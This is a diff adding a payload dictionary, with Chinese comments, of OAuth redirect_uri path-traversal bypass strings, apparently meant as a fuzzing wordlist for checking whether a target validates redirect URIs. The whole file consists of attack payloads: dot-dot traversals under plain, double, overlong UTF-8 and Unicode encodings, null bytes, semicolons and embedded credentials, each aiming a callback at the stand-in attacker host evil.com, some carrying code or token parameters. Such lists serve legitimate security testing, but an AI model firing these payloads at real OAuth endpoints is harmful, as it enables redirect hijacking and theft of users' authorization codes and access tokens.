@@ -1,0 +1,93 @@
+# OAuth Redirect URI - Path Traversal Attack Dictionary
+# 路径遍历攻击模式 - 利用目录遍历绕过重定向URI验证
+# 用于测试目标是否正确验证redirect_uri参数
+
+# 基础路径遍历
+https://target.com/callback/../evil.com
+https://target.com/callback/..%2Fevil.com
+https://target.com/callback/..%5Cevil.com
+https://target.com/callback/%2e%2e/evil.com
+https://target.com/callback/%2e%2e%2fevil.com
+https://target.com/callback/%2e%2e%5cevil.com
+
+# 多重路径遍历
+https://target.com/callback/../../evil.com
+https://target.com/callback/../../../evil.com
+https://target.com/callback/../../../../evil.com
+https://target.com/a/b/c/../../../../evil.com
+https://target.com/callback/..%2f..%2fevil.com
+https://target.com/callback/..%2f..%2f..%2fevil.com
+
+# URL编码变体
+https://target.com/callback/%252e%252e/evil.com
+https://target.com/callback/%252e%252e%252fevil.com
+https://target.com/callback/..%252fevil.com
+https://target.com/callback/%2e%2e%252fevil.com
+https://target.com/callback/..%c0%af/evil.com
+https://target.com/callback/..%c1%9c/evil.com
+
+# Unicode编码
+https://target.com/callback/..%u2216/evil.com
+https://target.com/callback/..%uff0f/evil.com
+https://target.com/callback/%uff0e%uff0e/evil.com
+https://target.com/callback/%uff0e%uff0e%uff0fevil.com
+
+# 混合编码
+https://target.com/callback/..%2f%2e%2e/evil.com
+https://target.com/callback/%2e%2e/..%2fevil.com
+https://target.com/callback/..%5c..%5cevil.com
+https://target.com/callback/%2e%2e%5c%2e%2e/evil.com
+
+# 带查询参数的路径遍历
+https://target.com/callback/../evil.com?code=123
+https://target.com/callback/..%2fevil.com?state=abc
+https://target.com/callback/../../evil.com?response_type=code
+
+# 带Fragment的路径遍历
+https://target.com/callback/../evil.com#token=xyz
+https://target.com/callback/..%2fevil.com#access_token=123
+
+# 双编码路径遍历
+https://target.com/callback/%252e%252e%252f%252e%252e%252fevil.com
+https://target.com/callback/..%252f..%252fevil.com
+
+# 特殊字符路径遍历
+https://target.com/callback/;/../evil.com
+https://target.com/callback/;/..%2fevil.com
+https://target.com/callback/;..%2f/evil.com
+https://target.com/callback/;foo/../evil.com
+
+# Windows风格路径遍历
+https://target.com/callback/..\evil.com
+https://target.com/callback/..%5Cevil.com
+https://target.com/callback/..%5C..%5Cevil.com
+https://target.com/callback/%2e%2e%5cevil.com
+
+# 混合大小写编码
+https://target.com/callback/..%2FEvil.com
+https://target.com/callback/..%2FEVIL.COM
+https://target.com/callback/%2E%2E/evil.com
+https://target.com/callback/%2E%2E%2Fevil.com
+
+# 带端口号的路径遍历
+https://target.com:443/callback/../evil.com
+https://target.com:80/callback/..%2fevil.com
+https://target.com:8080/callback/../../evil.com
+
+# 带认证信息的路径遍历
+https://user:pass@target.com/callback/../evil.com
+https://admin:admin@target.com/callback/..%2fevil.com
+
+# 复杂嵌套路径遍历
+https://target.com/api/v1/callback/../../../../evil.com
+https://target.com/auth/callback/../../../oauth/../../evil.com
+https://target.com/callback/..%2f..%2f..%2f..%2fevil.com
+
+# 空字节注入
+https://target.com/callback/%00/../evil.com
+https://target.com/callback/..%00/evil.com
+https://target.com/callback/..%2500/evil.com
+
+# 超长路径遍历（缓冲区溢出测试）
+https://target.com/callback/../../../../../../../../../../../../../../../../evil.com
+https://target.com/callback/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fevil.com
